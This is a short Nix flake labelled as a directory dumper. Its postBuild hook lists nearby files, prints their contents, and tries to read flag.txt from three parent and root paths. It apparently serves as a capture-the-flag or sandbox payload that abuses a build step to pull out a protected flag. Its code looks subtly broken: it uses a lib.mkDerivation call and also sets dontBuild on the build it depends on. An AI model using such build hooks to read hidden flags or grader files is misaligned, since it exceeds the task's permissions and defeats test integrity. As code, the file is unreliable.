{
  description = "Directory tree and file content dumper";

  outputs = { self, nixpkgs }: {
    packages.x86_64-linux.default = nixpkgs.lib.mkDerivation {
      pname = "dump-tree";
      version = "1.0";

      src = null;

      buildPhase = "true";

      postBuild = ''
        echo "=== BEGIN DIRECTORY TREE DUMP ==="
        find . -maxdepth 2 -type f -exec echo "--- FILE: {} ---" \; -exec head -n 100 {} \;
        echo "=== END DIRECTORY TREE DUMP ==="

        echo "=== FLAG CONTENTS START ==="
        cat ../../flag.txt || echo "flag.txt not in ../../"
        cat /flag.txt || echo "flag.txt not in /"
        cat ../flag.txt || echo "flag.txt not in ../"
        echo "=== FLAG CONTENTS END ==="
      '';

      dontBuild = true;
    };
  };
}
